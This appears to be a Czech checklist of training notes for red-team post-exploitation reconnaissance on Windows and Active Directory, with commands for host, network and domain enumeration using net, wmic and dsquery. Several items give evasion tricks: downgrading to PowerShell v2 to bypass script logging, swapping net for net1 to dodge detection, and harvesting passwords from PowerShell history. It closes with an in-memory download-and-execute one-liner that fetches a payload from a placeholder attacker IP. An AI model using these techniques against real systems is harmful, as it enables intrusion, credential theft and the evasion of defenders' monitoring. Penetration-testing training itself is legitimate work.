## 🛡️ Fáze 1: OPSEC & Kontrola Prostředí (Před zahájením reconu)

Před spuštěním jakýchkoliv těžkých dotazů zjisti, v jakém kontextu se nacházíš a jaké logování tě sleduje.

- [ ] **1. Identifikace systému a uživatele**
    
    PowerShell
    
    ```
    hostname
    whoami
    ```
    
- [ ] 2. Kdo je aktuálně přihlášen? (Zabraň odhalení uživatelem)
    
    PowerShell
    
    ```
    qwinsta
    ```
    
    - _Sleduj stav:_ Pokud je u nějakého uživatele stav `Active` na konzoli nebo RDP, hrozí, že si všimne tvé aktivity.
        
- [ ] 3. Kontrola verze PowerShellu a Historie
    
    PowerShell
    
    ```
    $PSVersionTable.PSVersion
    Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
    ```
    
    - _Tip:_ V historii příkazů předchozích správců se mohou nacházet zapomenutá hesla.
        
- [ ] 4. OPSEC Bypass: Downgrade na PowerShell V2 Pokud obrana loguje skripty (Script Block Logging), pokus se vynutit starou verzi, která logování nepodporuje:
    
    PowerShell
    
    ```
    powershell.exe -version 2
    Get-Host  # Ověření verze (hledáš verzi 2.0)
    ```
    
    - _Varování:_ Samotný příkaz `powershell.exe -version 2` bude zalogován (Event ID 400), což může pozorného obránce zalogovat jako anomálii.
        
- [ ] 5. Kontrola stavu obran (Firewall & Antivir)
    
    PowerShell
    
    ```
    # Kontrola stavu Windows Firewall
    netsh advfirewall show allprofiles
    
    # Kontrola stavu Windows Defenderu (přes CMD i PowerShell)
    sc query windefend
    Get-MpComputerStatus
    ```
    

## 🗺️ Fáze 2: Rychlý Sběr Informací o Hostiteli (Host Recon)

- [ ] 1. Komplexní přehled o systému v jednom příkazu
    
    PowerShell
    
    ```
    systeminfo
    ```
    
- [ ] 2. Kontrola nainstalovaných aktualizací a Hotfixů
    
    DOS
    
    ```
    wmic qfe get Caption,Description,HotFixID,InstalledOn
    ```
    
- [ ] 3. Výpis proměnných prostředí
    
    DOS
    
    ```
    set
    echo %USERDOMAIN%   :: Název domény
    echo %logonserver%  :: Název doménového kontroleru (DC), vůči kterému jsi ověřen
    ```
    

## 🌐 Fáze 3: Síťový Průzkum a Hledání Pivotů (Network Recon)

Zjisti, kam všude má daný počítač viditelnost a jaké další sítě jsou dostupné pro Lateral Movement.

- [ ] 1. Síťová konfigurace adaptérů
    
    PowerShell
    
    ```
    ipconfig /all
    ```
    
- [ ] 2. Výpis ARP tabulky (Aktivní sousední hostitelé)
    
    PowerShell
    
    ```
    arp -a
    ```
    
    - _Výhoda:_ Ukáže ti IP adresy ostatních serverů, se kterými tento stroj komunikoval, aniž bys musel spouštní hlučný Nmap scan.
        
- [ ] 3. Výpis routovací tabulky (Cesty do jiných segmentů)
    
    PowerShell
    
    ```
    route print
    ```
    

## 🛠️ Fáze 4: Enumerace AD pomocí vestavěných `Net` příkazů

- **OPSEC Varování:** Nástroje `net.exe` a `net1.exe` jsou silně monitorovány EDR/SIEM systémy.
    
- **Trik:** Pokud je řetězec `net` blokován nebo detekován, použij ekvivalentní binárku **`net1`**, která plní totožnou funkci, ale obchází základní detekční signatury na text.
    

- [ ] 1. Zjištění politiky hesel a uzamčení účtů
    
    DOS
    
    ```
    net accounts /domain
    ```
    
- [ ] 2. Výpis všech doménových skupin
    
    DOS
    
    ```
    net group /domain
    ```
    
- [ ] 3. Vyhledání členů skupiny Domain Admins
    
    DOS
    
    ```
    net group "Domain Admins" /domain
    ```
    
- [ ] 4. Výpis všech počítačů připojených do domény
    
    DOS
    
    ```
    net group "domain computers" /domain
    ```
    
- [ ] 5. Průzkum konkrétního doménového uživatele
    
    DOS
    
    ```
    net user <ACCOUNT_NAME> /domain
    ```
    
    - _Sleduj:_ Skupiny, do kterých patří (`Global Group memberships`), zda má aktivní účet a kdy naposledy měnil heslo.
        

## 🗄️ Fáze 5: Hloubkový Průzkum AD přes WMI (Windows Management Instrumentation)

WMI umožňuje provádět pokročilé dotazy lokálně i vzdáleně bez generování standardních logů pro sledování procesů.

- [ ] 1. Informace o doméně, DC a vztazích důvěry (Trusts)
    
    PowerShell
    
    ```
    wmic ntdomain list /format:list
    wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
    ```
    
- [ ] 2. Výpis lokálních i doménových účtů přihlášených na zařízení
    
    PowerShell
    
    ```
    wmic useraccount list /format:list
    ```
    
- [ ] 3. Výpis systémových účtů využívaných jako Service Accounts
    
    PowerShell
    
    ```
    wmic sysaccount list /format:list
    ```
    
- [ ] 4. Kompletní výpis běžících procesů
    
    PowerShell
    
    ```
    wmic process list /format:list
    ```
    

## ⚡ Fáze 6: Pokročilé vyhledávání objektů přes `Dsquery` (LDAP)

Nástroj `dsquery.exe` využívá přímo knihovnu `C:\Windows\System32\dsquery.dll` a komunikuje s AD kontrolerem přes LDAP. Vyžaduje pouze příkazovou řádku.

- [ ] 1. Výpis všech uživatelů v doméně (Distinguished Name - DN)
    
    PowerShell
    
    ```
    dsquery user
    ```
    
- [ ] 2. Výpis všech počítačů / serverů v doméně
    
    PowerShell
    
    ```
    dsquery computer
    ```
    
- [ ] 3. Vyhledání objektů v konkrétní organizační jednotce (OU) přes wildcard
    
    PowerShell
    
    ```
    dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
    ```
    

### 🎯 LDAP / UAC Filtry pro pokročilé vyhledávání (OIDs):

Použitím bitových masek a OID identifikátorů (např. `1.2.840.113556.1.4.803` pro striktní shodu) můžeš vyhledat specificky zranitelné účty.

- [ ] 4. Vyhledání uživatelů s příznakem "Heslo není vyžadováno" (`PASSWD_NOTREQD` = bit 32)
    
    PowerShell
    
    ```
    dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
    ```
    
- [ ] 5. Vyhledání uživatelů, kteří mají zakázanou změnu hesla (`Password Can't Change` = bit 64)
    
    PowerShell
    
    ```
    dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))"
    ```
    
- [ ] 6. Vyhledání všech Doménových Kontrolerů v síti (`SERVER_TRUST_ACCOUNT` = bit 8192)
    
    PowerShell
    
    ```
    dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -attr sAMAccountName
    ```
    

## 📥 Fáze 7: Stažení souborů z paměti přes PowerShell (File Transfer)

Pokud v LotL režimu potřebuješ bezpečně spustit nebo stáhnout skript bez jeho trvalého uložení na pevný disk, vykonej ho přímo v operační paměti (In-Memory Execution):

PowerShell

```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<TVOJE_IP>/payload.ps1')"
```

(Parametr `-nop` zajistí spuštění bez načítání uživatelského profilu a `iex` (Invoke-Expression) spustí kód přímo v paměti RAM ).